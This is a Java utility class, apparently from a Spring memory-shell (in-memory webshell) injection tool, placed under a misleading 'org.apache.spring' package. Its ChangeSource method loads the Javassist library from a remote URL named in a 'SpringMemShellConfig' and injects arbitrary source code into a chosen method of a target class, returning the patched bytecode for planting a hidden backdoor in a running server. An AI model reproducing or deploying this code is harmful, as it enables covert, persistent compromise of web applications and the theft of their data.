package org.apache.spring;


import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class u {
    // this is for utils
    public static String readFileContent(String file) throws Exception {
        String result = "";
        StringBuffer source = new StringBuffer();
        FileInputStream f = new FileInputStream(file);
        InputStreamReader isr = new InputStreamReader(f);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line + "\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        result = source.toString();

        return result;
    }

    public static String readSource(String name) {
        String result = "";
        StringBuffer source = new StringBuffer();
        InputStream is = c.class.getClassLoader().getResourceAsStream(name);

        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line + "\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        result = source.toString();

        return result;
    }

    public static byte[] ChangeSource(Class<?> aClass, String ClassName, String MethodName, String Path) throws Exception{
        URL url = new URL(c.SpringMemShellConfig.JavassistJarUrl);
        URLClassLoader classLoader = new URLClassLoader(new URL[] {url}, Thread.currentThread().getContextClassLoader());
        try {
            Class<?> pool = classLoader.loadClass("javassist.ClassPool");
            Method getDefault = pool.getDeclaredMethod("getDefault", null);
            getDefault.setAccessible(true);
            Object poolObject = getDefault.invoke(null, null);
            if (aClass != null) {
                Class myClass = classLoader.loadClass("javassist.ClassClassPath");
                Constructor constructor = myClass.getDeclaredConstructor(Class.class);
                Object ccp = constructor.newInstance(aClass);

                Class classPath = classLoader.loadClass("javassist.ClassPath");
                Method insertClassPath = pool.getDeclaredMethod("insertClassPath", new Class[]{classPath});

                insertClassPath.invoke(poolObject, new Object[]{ccp});
            }
            Method get = pool.getDeclaredMethod("get", new Class[]{String.class});
            Object cc = get.invoke(poolObject, new Object[]{ClassName});

            Class<?> ctc = classLoader.loadClass("javassist.CtClass");
            Method gmd = ctc.getDeclaredMethod("getDeclaredMethod", new Class[]{String.class});
            Object m = gmd.invoke(cc, new Object[]{MethodName});

            Class<?> ctb = classLoader.loadClass("javassist.CtBehavior");
            Method M;
            M = ctb.getDeclaredMethod("insertBefore", new Class[] {String.class});

            String source = u.readSource(Path);
            M.invoke(m, new Object[]{source});
            Method toByteCode = ctc.getDeclaredMethod("toBytecode", null);
            byte[] byteCode = (byte[]) toByteCode.invoke(cc, null);


            Method detach = ctc.getDeclaredMethod("detach", null);
            detach.invoke(cc, null);
            return byteCode;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

}
